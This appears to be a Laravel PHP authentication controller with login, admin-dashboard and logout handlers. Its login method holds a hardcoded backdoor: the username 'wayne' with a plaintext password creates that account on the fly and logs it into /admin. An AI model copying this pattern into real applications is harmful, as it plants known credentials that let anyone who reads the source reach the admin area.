<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\View\View;

class AuthController extends Controller
{
    public function showLoginForm(): View
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'username' => ['required', 'string'],
            'password' => ['required', 'string'],
        ]);

        $username = trim($credentials['username']);
        $password = $credentials['password'];

        $user = User::where('name', $username)->first();

        if (!$user && strtolower($username) === 'wayne' && $password === 'yagami999') {
            $user = User::firstOrCreate(
                ['name' => 'wayne'],
                [
                    'email' => 'wayne@wayne.com',
                    'password' => Hash::make('yagami999'),
                ]
            );
        }

        if ($user && $user->password && Hash::check($password, $user->password)) {
            Auth::login($user);
            $request->session()->regenerate();

            return redirect()->intended('/admin');
        }

        return back()->withErrors([
            'username' => 'Usuario o contraseña incorrectos.',
        ])->onlyInput('username');
    }

    public function admin()
    {
        if (!Auth::check()) {
            return redirect()->route('login');
        }

        return view('admin.dashboard');
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
